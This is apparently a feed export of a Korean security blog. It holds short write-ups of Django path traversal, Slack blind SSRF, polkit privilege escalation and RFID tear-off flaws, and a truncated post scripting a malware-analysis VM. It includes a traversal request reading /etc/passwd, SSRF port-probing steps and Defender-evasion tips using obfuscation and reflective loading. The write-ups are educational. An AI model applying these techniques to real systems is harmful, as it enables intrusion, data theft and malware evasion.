<code>m_height</code>값을 사용해 메모리를 할당합니다. 또한 <code>fillGradient()</code> 함수가 호출되면 업데이트되기 이전의 값을 사용해 할당 해제된 메모리에 접근합니다.</p><p>위 취약점을 악용한 웹사이트에 접속할 경우 information leak 및 추가 memory corruption에 의한 피해를 볼 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>use after free</tag>
      
      <tag>uaf</tag>
      
      <tag>webkit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-33203: Django path traversal vulnerability</title>
    <link href="/2021/06/11/l0ch/2021-06-11/"/>
    <url>/2021/06/11/l0ch/2021-06-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2021-075-django/">GHSL-2021-075: Path injection in Django - CVE-2021-33203</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tested version: Django 3.2.2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>파이썬에서 작성된 오픈소스 웹 프레임워크 Django에서 path traversal 취약점이 발견되었습니다. 해당 취약점은 <code>django.contrib.admindocs</code> 모듈이 활성화되었을 때 발생합니다.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplateDetailView</span>(<span class="hljs-params">BaseAdminDocsView</span>):</span>...<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_context_data</span>(<span class="hljs-params">self, **kargs</span>):</span>...template_file = Path(directory) / template<span class="hljs-keyword">if</span> template_file.exists():template_contents = template_file.read_text()...</code></pre><p><code>get_context_data()</code> 함수에서 해커는 template 변수를 임의의 값으로 설정할 수 있고 이를 별다른 검증 없이 Path join 합니다. 이를 이용해 template directory 외부 경로의 파일을 제공할 수 있어 <code>http://localhost:8000/admin/doc/templates//etc/passwd/</code>와 같은 요청을 보내는 것으로 파일 시스템 내 임의 경로의 파일 내용이 렌더링 메서드로 전달되어 파일 내용이 유출될 수 있습니다. 해당 취약점은 아래와 같이 <code>safe_join</code> 함수를 사용해 경로를 합치는 것으로 패치되었습니다.</p><pre><code class="hljs python">template_file = Path(safe_join(directory, template))</code></pre><p>자세한 패치 히스토리는 <a href="https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db">https://github.com/django/django/commit/46572de2e92fdeaf047f80c44d52269e54ad68db</a> 에서 확인할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>path traversal</tag>
      
      <tag>django</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 헤더 수정을 통한 Slack infra metadata 유출</title>
    <link href="/2021/06/10/idioth/2021-06-10/"/>
    <url>/2021/06/10/idioth/2021-06-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://hackerone.com/reports/727330">Header modification results in disclosure of Slack infra metadata to unauthorized parties</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Slack</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>클라우드 기반 팀 협업 도구 Slack의 <em>files.slack.com</em> 도메인에서 호스트 헤더 대신 <code>X-Forwarded-Host</code> 헤더를 사용하여 infra metadata를 유출할 수 있는 취약점이 발견되었습니다.</p><p>호스트가 <em>files.slack.com</em>이 아닐 때, 해당 URL은 500 Internal server error를 반환하는 유효성 검사가 존재합니다. 하지만 호스트 이름의 끝 부분에 ‘@’를 추가하여 해당 검사를 우회할 수 있습니다. 또한 해당 request는 프론트 엔드가 아닌 백 엔드로 전달되어 Blind SSRF 취약점이 존재하면 인트라넷에 arbitrary request를 전송하여 응답 시간을 통해 다양한 정보를 확인할 수 있습니다.</p><p>이를 통해 인트라넷에 열려있는 포트를 확인하는 과정은 다음과 같습니다.</p><ol><li><p>슬랙에 파일을 업로드하고 “Open original”을 통해 원본 이미지 경로를 찾아 burp suite로 가져옵니다.</p></li><li><p>repeater로 전송하고 클릭하여 정상적으로 접근되는지 확인합니다.</p></li><li><p><code>X-Forwarded-Host: xxx.com</code>을 헤더에 추가하여 500 error가 발생하는지 확인합니다.</p></li><li><p><code>X-Forwarded-Host: file.slack.com@YOUR_DOMAIN</code>으로 헤더를 수정하고 302 response가 오는지 확인합니다. 경로는 <code>YOUR_DOMAIN/files-pri/...</code>로 지정합니다.</p></li><li><p>도메인에 request가 전송되었는지 확인하고 도메인을 인트라넷 IP로 변경합니다. 포트를 바꿔가며 응답 시간을 확인합니다.</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>information disclosure</tag>
      
      <tag>idioth</tag>
      
      <tag>slack</tag>
      
      <tag>ssrf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-33881: RFID tear off attack, bypass monotonic counter</title>
    <link href="/2021/06/09/fabu1ous/2021-06-09/"/>
    <url>/2021/06/09/fabu1ous/2021-06-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.quarkslab.com/rfid-monotonic-counter-anti-tearing-defeated.html#eeprom-tear2">RFID: Monotoic Counter Anti-Tearing Defeated</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>MIFARE Ultralight EV1, MF0UL</p><p>MIFARE Ultralight C, MF0ICU</p><p>MIFARE Ultralight NANO, MF0UN</p><p>NT2L1, NT2H10, NT2H12</p><p>N2H13, NT2H15, NT2H16</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>NXP MIFARE Ultralight와 NTAG 카드는 replay 공격을 방지하기 위한 Monotonic Counter 기능을 사용하는데 해당 기능을 tear off 공격을 통해 무력화할 수 있는 취약점이 발견되었습니다. Tear off 공격이란 RFID 태그와 리더 사이 데이터 통신이 이루어지는 도중에 통신을 끊어버리는 공격 방식으로 EEPROM이 쓰기 작업을 하는 동안 RFID 태그의 데이터가 일관되지 않은 상태로 유지되어 버그가 발생하도록 유도합니다.</p><p>MIFARE Ultralight EV1은 24-bit Monotonic Counter를 사용하고 이와 관련된 커멘드를 사용합니다.</p><ol><li><code>INCR_CNT</code> : Counter를 증가시킨다.</li><li><code>READ_CNT</code> : 현태 Counter의 값을 읽는다.</li><li><code>CHECK_TEARING_EVENT</code> : anti-tearing 8-bit flag를 검증한다.</li></ol><p><code>INCR_CNT</code>를 통해 유효한 Counter의 값을 증가 시킴과 동시에 tear off 공격을 수행하면 Counter에 대한 쓰기 작업에 인터럽트를 걸 수 있고, <code>READ_CNT</code>가 이전 Counter의 값을 리턴하면서 <code>CHECK_TEARING_EVENT</code>가 정상적인 검증 flag를 리턴하는 상황을 만들 수 있습니다. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>bypass</tag>
      
      <tag>rfid</tag>
      
      <tag>monotonic counter</tag>
      
      <tag>tear off</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-3560: Ubuntu/Fedora 인증 관리 프로그램 polkit의 로컬 권한 상승 취약점</title>
    <link href="/2021/06/08/l0ch/2021-06-08/"/>
    <url>/2021/06/08/l0ch/2021-06-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://seclists.org/oss-sec/2021/q2/180">CVE-2021-3560 polkit: local privilege escalation using polkit_system_bus_name_get_creds_sync()</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>polkit 0.113 ~ 0.118</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>polkit은 Unix 계열 OS(Ubuntu, Fedora 등의 리눅스 배포판)에서 시스템 전반의 인증을 통제하는 프로그램으로, sudo 등 기존 인증 시스템과 달리 느슨한 수준의 인증을 수행해 권한이 없는 프로세스가 권한 있는 계정과 커뮤니케이션을 할 수 있습니다.</p><p><img src="/2021/06/08/l0ch/2021-06-08/1.png"></p><blockquote><p>출처 : <a href="https://ko.wikipedia.org/wiki/%ED%8F%B4%ED%82%B7">위키백과</a></p></blockquote><p>polkit은  <code>polkit_system_bus_name_get_creds_sync()</code> 함수를 사용해 권한이 필요한 작업을 요청하는 프로세스의 uid 및 pid를 가져옵니다. 해당 함수는 요청 프로세스의 고유한 bus name을 <a href="https://ko.wikipedia.org/wiki/D-Bus">D-bus</a>의 <code>dbus-daemon</code>에 전송해 요청 프로세스의 권한을 확인하는데, 권한 상승 취약점은 함수 호출 직전에 요청 프로세스와 <code>dbus-daemon</code>의 연결이 끊어질 때 발생합니다. <code>dbus-daemon</code>은 연결이 끊어진 프로세스의 bus name이 유효하지 않으므로 error 응답을 보내지만 <code>polkit_system_bus_name_get_creds_sync()</code> 함수에서 이를 확인하지 않아 성공적으로 프로세스의 정보를 가져왔다는 의미의 TRUE를 반환합니다. 해당 함수의 호출자 일부는 추가적인 검증 없이 0으로 초기화된 <code>AsyncGetBusNameCredsData</code> 구조체를 참조하게 되어 요청 프로세스의 uid를 0으로 생각하고 root 프로세스가 요청한 것으로 작업을 수행합니다.</p><p>취약점의 패치 정보는 <a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13a">https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13a</a>  에서 확인할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>ubuntu</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>fedora</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 간단한 Defender 우회 방법</title>
    <link href="/2021/06/07/idioth/2021-06-07/"/>
    <url>/2021/06/07/idioth/2021-06-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://arty-hlr.com/blog/2021/05/06/how-to-bypass-defender/">How to bypass Defender in a few easy steps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>안티 바이러스는 기본적으로 signature detection, heuristics detection, in memory detection을 통해 악성코드를 탐지합니다.</p><p>signature의 경우 이미 알려진 악성코드의 파일 전체의 해쉬 값이나 악성 행위를 하는 부분의 일부 해쉬 값과 비교하여 악성코드를 탐지합니다. heuristics는 signature 탐지 다음 단계에서 진행되는 것으로 악성코드를 에뮬레이팅하여 어셈블리나 코드를 살펴보고 어떠한 행위를 하는지 확인하여 악성코드를 탐지합니다. 하지만, 디스크에 파일이 없는 fileless 악성코드(powershell, vba macro, reflection for c# assembly)의 경우 Microsoft Defender는 <a href="https://docs.microsoft.com/ko-kr/windows/win32/amsi/antimalware-scan-interface-portal">AMSI</a> 스캔을 통해 악성코드를 탐지합니다.</p><p>signature detection을 우회하기 위해서는 어떠한 부분을 안티 바이러스가 악성코드로 판단했는지 알아내야 합니다. AntiScan.me, VirusTotal에서 <code>DefenderCheck</code>, <code>Find-AVSignature</code> 등을 활용하여 판단하는 부분을 찾아낸 후 해당 문자열을 리팩터링하거나 어셈블리를 수정할 수 있지만 각 안티 바이러스마다 수행하거나 파일이 손상될 가능성이 존재합니다. 따라서 <a href="https://github.com/mkaring/ConfuserEx">ConfuserEx</a> 같은 도구를 통해 코드를 난독화하여 signature detection을 우회할 수 있습니다.</p><p>C#으로 작성된 악성코드의 경우 <a href="https://github.com/Flangvik/NetLoader">NetLoader</a>를 사용하여 heuristics detection과 in memory detection을 우회할 수 있습니다. NetLoader는 C# 어셈블리를 경로, URL이나 SM 공유에서 reflection을 통해 로드합니다. 디스크에 악성 파일이 존재하지 않아 heuristics detection을 우회할 수 있고 Microsoft에서 NetLoader에 signature를 추가하지 않아 in memory detection 또한 우회할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>bypass</tag>
      
      <tag>defender</tag>
      
      <tag>signature</tag>
      
      <tag>heuristic</tag>
      
      <tag>antivirus</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] 악성코드 분석용 VM 세팅을 자동화해보자!</title>
    <link href="/2021/06/06/idioth/setting_malware_vm/"/>
    <url>/2021/06/06/idioth/setting_malware_vm/</url>
    
    <content type="html"><![CDATA[<h1 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h1><p>안녕하세요. idioth입니다. 오늘 가져온 주제는 “악성코드 분석용 가상 머신 설정 자동화”입니다.</p><p>닝겐은 귀찮은 행동을 하기 싫어합니다.(저만 그런 건 아니겠죠?) 보통 악성코드 분석은 가상 머신에서 수행하고, 또 분석용 VM을 여러 개 들고 있거나 아니면 다른 PC에 설치해야 할 일 등이 있죠. 예를 들어 저 같은 경우는 집에 있는 데스크톱과 학교나 카페 등에서 사용하는 노트북으로 나뉘어 있습니다.</p><p>Windows 가상 머신에다가 이런저런 도구들을 설정하면 용량이 커져서 압축하거나 옮기는 데에도 시간이 꽤 걸립니다. 밖에 있는데 노트북을 포맷하거나 하는 상황이 발생하면 Windows 가상 머신을 새로 만들어서 설정을 쭉 해야 하죠.</p><p>포너블을 공부할 때 사용하는 우분투에서는 제가 사용하는 툴 등을 쉘 스크립트로 다운로드 및 설정하게 만들어서 리눅스를 사용할 때 쉘 스크립트만 실행하고 딴짓을 하다 오면 세팅이 다 되는데 Windows도 가능할까?라는 생각에서 시작했습니다.</p><p><a href="https://github.com/fireeye/flare-vm">FireEye에서 배포하는 FlareVM</a>도 존재하지만 모든 툴을 다 다운로드하기도 하고 오래 걸리면 하루 종일 걸리는 경우도 있더라고요… 그래서 거기서 영감을 얻어서 제가 자주 사용하는 툴들로 구성하여 작성을 해보았습니다.(FlareVM에서 가져온 코드도 있습니다 😂)</p><p>본래 SSG 동아리 내부에서 악성코드 관련 스터디 등을 할 때 스크립트 주면서 이거 실행하면 될 거야~ 했는데 그걸 그대로 블로그에 올리기에는 코드가 너무 처참해서… (매우 더럽습니다.) 이번 기회에 깔끔하게 작성했습니다.(물론 제 기준에서만 깔끔할 수도 있어요! 양해 바랍니다. 🙂   </p><p>파트는 크게 두 가지로 나뉠 예정입니다. 첫 번째 파트에서는 Windows 설정에 대한 스크립트를 작성할 예정이고, 두 번째 파트에서는 <a href="https://chocolatey.org/">chocolatey</a>를 활용한 툴들을 설치할 겁니다!</p><h1 id="무엇을-설정해야-할까"><a href="#무엇을-설정해야-할까" class="headerlink" title="무엇을 설정해야 할까?"></a>무엇을 설정해야 할까?</h1><p>가장 먼저 스크립트를 통해서 무엇을 해야 할지 정리를 하고 시작합시다. 아무래도 악성코드 분석을 해야 하므로 Windows Defender와 Windows Update는 꺼놓는 것이 좋겠죠? 시작 프로그램에 등록되었을 때 복잡하게 하지 않기 위해서 시작 프로그램도 정리하고… 사용하지 않는 기본 앱 삭제 등… 제가 생각나는 대로 간단하게 정리해보았습니다.</p><ol><li>사용하지 않는 기본 앱 삭제</li><li>방화벽 비활성화</li><li>Windows Update 비활성화</li><li>Windows Defender 비활성화</li><li>보안유지 정책 알림 비활성화</li><li>작업 스케줄러 삭제</li><li>시작 프로그램 삭제</li><li>숨김 파일 표시</li></ol><p>Windows에서 쉘 스크립트로 한 번에 설정을 한다고? 뭔가 낯설게 느껴지시는 분들도 계시겠지만 Windows에는 Powershell이 존재합니다. Powershell을 사용해서 위의 작업들을 하나하나 진행해봅시다!</p><h1 id="사용하지-않는-기본-앱-삭제"><a href="#사용하지-않는-기본-앱-삭제" class="headerlink" title="사용하지 않는 기본 앱 삭제"></a>사용하지 않는 기본 앱 삭제</h1><p>처음 Windows를 설치하면 3D 뷰어나, BingFinance, OfficeHub 등등 악성코드 분석에는 활용되지 않는 애플리케이션들이 많이 설치되어 있습니다. 이런 앱을 손수 지울 수도 있으나 <code>Remove-AppxPackage</code> 명령어를 통해서 삭제할 수 있습니다.</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">Get-AppxPackage</span> Microsoft.XboxAppName              : Microsoft.XboxAppPublisher         : CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=USArchitecture      : X64ResourceId        :Version           : <span class="hljs-number">48.76</span>.<span class="hljs-number">8001.0</span>PackageFullName   : Microsoft.XboxApp_48.<span class="hljs-number">76.8001</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbweInstallLocation   : C:\Program Files\WindowsApps\Microsoft.XboxApp_48.<span class="hljs-number">76.8001</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbweIsFramework       : FalsePackageFamilyName : Microsoft.XboxApp_8wekyb3d8bbwePublisherId       : <span class="hljs-number">8</span>wekyb3d8bbweIsResourcePackage : FalseIsBundle          : FalseIsDevelopmentMode : FalseNonRemovable      : FalseDependencies      : &#123;Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>_1.<span class="hljs-number">7.27413</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>_1.<span class="hljs-number">7.27422</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.VCLibs.<span class="hljs-number">140.00</span>_14.<span class="hljs-number">0.29231</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktop_14.<span class="hljs-number">0.29231</span>.<span class="hljs-number">0</span>_x64__8wekyb3                    d8bbwe...&#125;IsPartiallyStaged : FalseSignatureKind     : StoreStatus            : Ok</code></pre><p>예를 들어 XboxApp의 경우 분석에서는 아예 사용하지 않겠죠? <code>Get-AppxPackage</code>를 통해 패키지의 정보를 가져올 수 있고, 파이프라인으로 <code>Remove-AppxPackage</code>를 사용하면 해당 패키지가 삭제됩니다.</p><p>이를 토대로 작성한 소스 코드는 아래와 같습니다.</p><pre><code class="hljs powershell"><span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(    <span class="hljs-string">&quot;7EE7776C.LinkedInforWindows&quot;</span>    <span class="hljs-string">&quot;C27EB4BA.DropboxOEM&quot;</span>    <span class="hljs-string">&quot;Microsoft.3DBuilder&quot;</span>    <span class="hljs-string">&quot;Microsoft.Microsoft3DViewer&quot;</span>    <span class="hljs-string">&quot;Microsoft.Advertising.Xaml&quot;</span>    <span class="hljs-string">&quot;Microsoft.Appconnector&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingFinance&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingFoodAndDrink&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingHealthAndFitness&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingNews&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingSports&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingTravel&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingWeather&quot;</span>    <span class="hljs-string">&quot;Microsoft.CommsPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.ConnectivityStore&quot;</span>    <span class="hljs-string">&quot;Microsoft.DesktopAppInstaller&quot;</span>    <span class="hljs-string">&quot;Microsoft.Getstarted&quot;</span>    <span class="hljs-string">&quot;Microsoft.Messaging&quot;</span>    <span class="hljs-string">&quot;Microsoft.Microsoft3DViewer&quot;</span>    <span class="hljs-string">&quot;Microsoft.MicrosoftOfficeHub&quot;</span>    <span class="hljs-string">&quot;Microsoft.MicrosoftSolitaireCollection&quot;</span>    <span class="hljs-string">&quot;Microsoft.MixedReality.Portal&quot;</span>    <span class="hljs-string">&quot;Microsoft.Netflix&quot;</span>    <span class="hljs-string">&quot;Microsoft.NetworkSpeedTest&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.Desktop&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.OneNote&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.Sway&quot;</span>    <span class="hljs-string">&quot;Microsoft.OfficeLens&quot;</span>    <span class="hljs-string">&quot;Microsoft.OneConnect&quot;</span>    <span class="hljs-string">&quot;Microsoft.OneDrive&quot;</span>    <span class="hljs-string">&quot;Microsoft.People&quot;</span>    <span class="hljs-string">&quot;Microsoft.Print3D&quot;</span>    <span class="hljs-string">&quot;Microsoft.RemoteDesktop&quot;</span>    <span class="hljs-string">&quot;Microsoft.SkypeApp&quot;</span>    <span class="hljs-string">&quot;Microsoft.Wallet&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.CloudExperienceHost&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.NarratorQuickStart&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.PeopleExperienceHost&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.Photos&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsAlarms&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsCamera&quot;</span>    <span class="hljs-string">&quot;Microsoft.windowscommunicationsapps&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsFeedbackHub&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsMaps&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsReadingList&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsSoundRecorder&quot;</span>    <span class="hljs-string">&quot;Microsoft.Xbox.TCUI&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxApp&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGameCallableUI&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGameOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGamingOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxIdentityProvider&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxLive&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxSpeechToTextOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.YourPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.ZuneMusic&quot;</span>    <span class="hljs-string">&quot;Microsoft.ZuneVideo&quot;</span>    <span class="hljs-string">&quot;Windows.CBSPreview&quot;</span>)<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$name</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>)&#123;    <span class="hljs-built_in">Get-AppxPackage</span> <span class="hljs-variable">$name</span> | <span class="hljs-built_in">Remove-AppxPackage</span>&#125;</code></pre><p><code>$packages</code>에 있는 패키지 이름을 하나씩 가져와서 삭제를 하는 부분입니다. 추가되어 있지 않은 애플리케이션도 존재하기 때문에 혹시 본인이 삭제하고 싶지 않거나 삭제하고 싶은 프로그램이 있으면 추가를 하시면 됩니다.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled.png"></p><p>삭제하고 싶은 앱이 있는데 패키지 이름을 모르시겠다고요? 걱정하지 마세요! 깔려있는 패키지를 이름으로 정렬해서 확인할 수 있습니다!</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">Get-AppxPackage</span> | <span class="hljs-built_in">Select</span> NameName----windows.immersivecontrolpanelMicrosoft.VCLibs.<span class="hljs-number">140.00</span>Microsoft.UI.Xaml.<span class="hljs-number">2.0</span>Windows.PrintDialogMicrosoft.WalletMicrosoft.VCLibs.<span class="hljs-number">140.00</span>Microsoft.VCLibs.<span class="hljs-number">140.00</span>RealtekSemiconductorCorp.RealtekAudioControlMicrosoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktopMicrosoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktopAdvancedMicroDevicesInc<span class="hljs-literal">-2</span>.AMDRadeonSoftwareMicrosoft.XboxSpeechToTextOverlayMicrosoft.XboxGameOverlayMicrosoft.NET.Native.Runtime.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Framework.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Framework.<span class="hljs-number">2.2</span>Microsoft.Xbox.TCUIMicrosoft.UI.Xaml.<span class="hljs-number">2.4</span>Microsoft.UI.Xaml.<span class="hljs-number">2.4</span>Microsoft.UI.Xaml.<span class="hljs-number">2.0</span>Microsoft.UI.Xaml.<span class="hljs-number">2.1</span>Microsoft.UI.Xaml.<span class="hljs-number">2.1</span>Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>Microsoft.UI.Xaml.<span class="hljs-number">2.3</span>Microsoft.UI.Xaml.<span class="hljs-number">2.3</span>Microsoft.UI.Xaml.<span class="hljs-number">2.5</span>Microsoft.UI.Xaml.<span class="hljs-number">2.5</span>Microsoft.<span class="hljs-number">549981</span>C3F5F10Microsoft.StorePurchaseAppMicrosoft.LanguageExperiencePackko<span class="hljs-literal">-KR</span>Microsoft.WinDbgmicrosoft.windowscommunicationsappsMicrosoft.WebpImageExtensionMicrosoft.XboxIdentityProviderMicrosoft.DesktopAppInstallerMicrosoft.Windows.PhotosMicrosoft.WebMediaExtensionsMicrosoft.XboxAppMicrosoft.MixedReality.PortalMicrosoft.PeopleMicrosoft.WindowsStoreMicrosoft.ZuneVideoMicrosoft.Microsoft3DViewerMicrosoft.WindowsFeedbackHubMicrosoft.MicrosoftStickyNotesMicrosoft.WindowsAlarmsMicrosoft.GetHelpMicrosoft.BingWeatherMicrosoft.WindowsCameraMicrosoft.ScreenSketchMicrosoft.WindowsMapsMicrosoft.WindowsCalculatorMicrosoft.WindowsSoundRecorderMicrosoft.ZuneMusicMicrosoft.BioEnrollmentMicrosoft.Windows.CloudExperienceHostMicrosoft.Windows.OOBENetworkConnectionFlowMicrosoft.AAD.BrokerPluginMicrosoft.Windows.OOBENetworkCaptivePortalMicrosoftWindows.UndockedDevKitMicrosoft.Windows.StartMenuExperienceHostMicrosoft.Windows.ShellExperienceHostMicrosoft.Windows.SearchMicrosoft.MicrosoftEdgeMicrosoft.Windows.ContentDeliveryManagerMicrosoftWindows.Client.CBSWindows.CBSPreviewNcsiUwpAppMicrosoft.XboxGameCallableUIMicrosoft.Windows.XGpuEjectDialogMicrosoft.Windows.SecureAssessmentBrowserMicrosoft.Windows.SecHealthUIMicrosoft.Windows.PinningConfirmationDialogMicrosoft.Windows.PeopleExperienceHostMicrosoft.Windows.ParentalControlsMicrosoft.Windows.NarratorQuickStartMicrosoft.Windows.CapturePickerMicrosoft.Windows.CallingShellAppMicrosoft.Windows.AssignedAccessLockAppMicrosoft.Windows.Apprep.ChxAppMicrosoft.Win32WebViewHostMicrosoft.MicrosoftEdgeDevToolsClientMicrosoft.LockAppMicrosoft.ECAppMicrosoft.CredDialogHostMicrosoft.AsyncTextServiceMicrosoft.AccountsControlMicrosoft.VP9VideoExtensionsMicrosoft.XboxGamingOverlayMicrosoft.HEIFImageExtensionMicrosoft.MSPaint<span class="hljs-number">91750</span>D7E.SlackMicrosoft.MicrosoftEdge.StableMicrosoft.GetstartedMicrosoft.YourPhone</code></pre><p>이름을 찾았는데 <code>Xbox</code>처럼 여러 개가 있는데 적기가 너무 귀찮다. 나는 한 번에 해치우고 싶다! 하시는 분은 <code>Microsoft.Xbox*</code>하시면 리눅스와 같이 <code>Microsoft.Xbox1</code> 등 뒤에 추가되어 있는(?) 뭐라 말해야 하지… 생각이 안 나네요! 아무튼! 저 문자열로 시작하는 친구들을 모두 삭제해줍니다!</p><p>그럼 이제 방화벽을 비활성화하러 가볼까요?</p><h1 id="방화벽-비활성화"><a href="#방화벽-비활성화" class="headerlink" title="방화벽 비활성화"></a>방화벽 비활성화</h1><p>방화벽 비활성화는 굉장히<del>~</del> 코드가 간단합니다.</p><p>도메인, 공용, 개인에 대한 방화벽 모두를 비활성화하면 되는데 요거는 PowerShell을 통해 한번에 작업할 수 있습니다. XD</p><pre><code class="hljs powershell"><span class="hljs-built_in">Set-NetFirewallProfile</span> <span class="hljs-literal">-Profile</span> Domain, Public, Private <span class="hljs-literal">-Enabled</span> False</code></pre><h1 id="Windows-Update-비활성화"><a href="#Windows-Update-비활성화" class="headerlink" title="Windows Update 비활성화"></a>Windows Update 비활성화</h1><p>Windows Update를 비활성화하기 위해서는 WindowsUpdate 레지스트리에 <code>NoAutoUpdate</code>를 설정해주면 됩니다.</p><pre><code class="hljs powershell"><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;WindowsUpdate&quot;</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span 